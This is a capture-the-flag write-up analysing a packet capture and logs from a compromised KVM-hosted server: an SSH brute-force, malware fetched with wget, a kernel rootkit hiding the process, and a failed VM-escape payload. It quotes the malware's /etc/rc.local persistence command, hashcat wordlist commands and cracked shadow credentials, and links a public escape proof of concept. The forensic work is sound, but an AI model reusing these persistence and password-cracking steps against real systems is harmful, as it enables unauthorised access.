# Escape Room - Packet Analysis

## Description
You belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.

## Questions

### <b><u> 1 - What service did the attacker use to gain access to the system?</u></b>

The files provided are a 
``` 
hp_challenge.pcap <- Traffic capture
ps.log            <- Processes at a given time
sudoers.log       <- sudoers file at a given time
shadow.log        <- shadow file at a given time
``` 

From the **.logs** i cant really answer the question, leaving the **.pcap** analysis left <br>

There are a vast ammount of SSHv2 requests (combined with the amount of new keys exchanged) from the same source, leading to believe that it was a brute force attack <br> 

**Answer:** SSH
</br>

### <b><u> 2- What attack type was used to gain access to the system?</u></b>

As stated above, brute-force <br>

**Answer:** brute force

### <b><u> 3 - What was the tool the attacker possibly used to perform this attack?</u></b>

Well, i found no evidence (through the pcap) of which tool was used, but given the hint in the submission field (**H....**), i assume its hydra<br>

**Answer:** Hydra


### <b><u> 4 - How many failed attempts were there?</u></b>

My approach to solve this is by excluding "**noise**" from the capture. In order to do this i filtered by
```
Protocol (ssh)                       <- Attack vector
Source IP (23.20.23.147)             <- Attacker IP
Destination Port (22)                <- Server SSH port
Relative package sequence number (1) <- Ensures the beggining of the key exchange
```

And so, building it, we get the filter expression as followed
```
ssh && ip.src == 23.20.23.147 && tcp.dstport == 22 && tcp.seq == 1
```

Now, this returns 54 entries but we can see in the last 2 entries a difference of 5 seconds which indicates delay due to the user inputing the password for the session.<br>

We now have 53 attempts but the last was not an attempt, it was an actual access (the password matched), so the answer is 52

**Answer:** 52

### <b><u> 5 - What credentials (username and password) were used to gain access? Refer to shadow.log and sudoers.log. </u></b>

Well, we just have the hases and the usernames, lets try to crack the hashes with hashcat
```
cmd: hashcat -m 1800 -a 0 -o cracked -O hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt

-m 1800 <- sha512 bcrypt
```

We got one result ! 

``` 
manager:$6$SaltVal2$ybuPu7Nmo9LKn0p0ozhFhFw2SS2cqkLsx8c5OEAWFkIJjtXBEJqxUQzLh900QMgFTGiw6YuFDueNAapfLKt0f1:forgot
```
Luckly is the one being asked!

**Answer:** manager:forgot

### <b><u> 6 - What other credentials (username and password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log. </u></b>

Well, the last wordlist did not catched more so lets try with the the same command but other wordlist

```
cmd:  hashcat -m 1800 -a 0 -o cracked -O hashes /opt/SecLists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt
```

Broke a bunch of hashes (god those were weak)
```
sterling:$6$SaltVal9$7oq808gj5Pm4vzJQ7rOWXHtUiJw.qfmEhcmqhGYWUr.r3n4/G5V12QWVaJq7DPura/ZEVPqEUUpMlYzv412Qb1:Guest
gibson:$6$SaltVal3$ub1ejU/gJOqG1gKnGhSypMtVJouMJ9JmVOYgptXcL0HLSfA84ZH.uwngUpf5XiLp0hu/E2hVh.CLBp2U24Uac1:god
sean:$6$SaltVal4$rIpTjZrVyyX4Lz0/TMvx3FjUbRRMEgKJ2vnQwBgaoSWeLm/VZifQvBco8AnpVQWhNvMolnyY43X5/i5YK/TIw.:spectre
```
From the cracked ones, only sean is in the sudoers file

**Answer:**sean:spectre

### <b><u> 7 - What is the tool used to download malicious files on the system? </u></b>

If we apply some filters we can reach a more clean listing
```
!ssh                      <- discard ssh communication
frame.nr > 1417           <- frames above the ssh session initiation 
!(ip.src == 23.20.23.147) <- connections that did not started from the attacker (because he pulled)

Filter: !ssh && frame.number > 1417 && !(ip.src == 23.20.23.147)
```

We can then see an http GET request to the attacker's machine.
```
1744	122.331491	10.252.174.188	23.20.23.147	HTTP	181	GET /d/1 HTTP/1.1 
```
Following the tcp stream for that packet we can see the header
```
GET /d/1 HTTP/1.1
User-Agent: Wget/1.13.4 (linux-gnu)
Accept: */*
Host: 23.20.23.147
Connection: Keep-Alive
```

**Answer:**wget

### <b><u> 8 - How many files the attacker download to perform malware installation? </u></b>

Craft a filter from the previous one
```
Filter: http && ip.src == 10.252.174.188

1744	122.331491	10.252.174.188	23.20.23.147	HTTP	181	GET /d/1 HTTP/1.1 
1795	122.580931	10.252.174.188	23.20.23.147	HTTP	181	GET /d/2 HTTP/1.1 
2020	122.852487	10.252.174.188	23.20.23.147	HTTP	181	GET /d/3 HTTP/1.1 
```

**Answer:** 3

### <b><u> 9 - What is the main malware MD5 hash? </u></b>

To obtain the downloaded files we can use wireshark exporting objects for the http connections<br>

Saving the 3 files we have the following information
```
cmd: file 1 2 3 && md5sum 1 2 3

1: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
2: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=21064e0e38e436aa28aecd2612f20205977b3826, with debug_info, not stripped
3: Bourne-Again shell script, ASCII text executable

772b620736b760c1d736b1e6ba2f885b  1
2f41df5a12a1f64e47dede21f1c47326  2
dadbb7fe0577d016bb825d3c59dc3715  3
```

**Answer:** (md5sum 1) 772b620736b760c1d736b1e6ba2f885b

### <b><u> 10 - What file has the script modified so the malware will start upon reboot? </u></b>

Analyzing the file **3** we can see that it modifies **/etc/rc.local** (by overwriting its contents with other commands) which executes after on initialization and servers a compatibility layer for applications that does not support the **init.d** mechanism
```
echo -e "/var/mail/mail &\nsleep 1\npidof mail > /proc/dmesg\nexit 0" > /etc/rc.local
```

**Answer:** /etc/rc.local

### <b><u> 11 - Where did the malware keep local files? </u></b>

From the "auto-run" command seen before we can see the answer

**Answer:** /var/mail/

### <b><u> 12 - What is missing from ps.log? </u></b>

We can't see the malware there ! 

**Answer:** /var/mail/mail

### <b><u> 13 - What is the main file that used to remove this information from ps.log? </u></b>

Through the shell script we can see that it moves the file **2** to **/lib/modules/`uname -r`/sysmod.ko** <br>

Searching its hash in **VirusTotal** we have one detection for a Linux Rootkit which leads to believe that this elf is responsible for the removing of the process from the ps output <br>

Lets load it in IDA. We can see from it that it has several functions but at **myinit** it loads the needed information and performs the needed verifications and at **myexit** it calls **remove_proc_entry** with the collected and needed information. The remove proc_entry is an external function so from this file cant really check what the code itself does. 

**Answer:** sysmod.ko

### <b><u> 14 - What IPs had the malware connected to? </u> <b>

We know that the server IP is **10.252.174.188**. If we go to **wireshark->Statistics->Endpoints** we get a list of all the endpoints in the capture getting the following result
``` 
10.252.174.188      <- Server
23.20.23.147   
23.21.35.128   
23.22.228.174  
174.129.57.253 
```

**Answer:** 23.20.23.147,23.21.35.128,23.22.228.174,174.129.57.253 

### <b><u> 15 - Inside the Main function, what is the function that causes requests to those servers? </u> <b>

Since we saw, when analyzing the file **2** that there was no main funtion, now we might need to analyze the file **1** <br>

Loading it into IDA. The code shown was strange and looked that did nothing important! Using strings on it (in order to find some function names) the first one was UPX! which strongly indicates that it is packed ! <br>

Running the **Detect-it-easy** program it confirms my suspicions
```
filetype: ELF64
arch: AMD64
mode: 64
endianess: LE
type: EXEC
  packer: UPX(3.08)[NRV,best]
  compiler: gcc((Ubuntu/Linaro 4.6.3-1u???;5))[EXEC AMD64-64]
```

Now unpack it
```
cmd: upx -d 1
```

Analyzing the main function we find that the files are requested by the function: **requestFile**

**Answer:** requestFile

### <b> <u> 16 - How many files the malware requested from those servers?</u> </b>

Well, we can base the response (once again) in the capture by just applying some simple filtering
``` 
Filter: http && http.request.method == GET
```

If we discard the initial malware download, we can see 9 entries 

**Answer:** 9

### <b> <u> 17 - What are the commands that the malware was receiving from attacker servers? </u> </b>

Looking at the functions available (we have their names because the binary is not stripped) and there's one named **processMessage()**<br>

Analyzin it, we can see a branch which will do something depending on a HEX value (ghidra decompiles to hex). Those values, converted to string produce
```
RUN, NOP
```

**Answer:**RUN,NOP


### <b> <u> 18 - The image files are important because they contain the RSA-encrypted payload(s). Find the private key decryption exponent for the first file. "The public RSA key given in the HTTP request must be factored, but note that Fermat’s factorization method is very effective." </u> </b>

```
Yeah, dont really know how to solve, i mean it's using steaganography ....
```

### <b> <u> 19 - The final payload is a binary aimed to escape the Qemu/KVM virtualization and run code on the host operating system. What is the PoC command that has been executed? </u> </b>

From the [PoC](https://github.com/nelhage/virtunoid/blob/master/virtunoid.c) we can see the source code ! We should've extracted it from the files but i could not solve the stega and decryption so i searched for the exploit online

**Answer:**/usr/bin/gnome-calculator


### <b> <u> 20 - This attack was not successful because there was a bug in the malware. What is the error message that comes with this fault? </u> </b>

**Answer:** Segmentation fault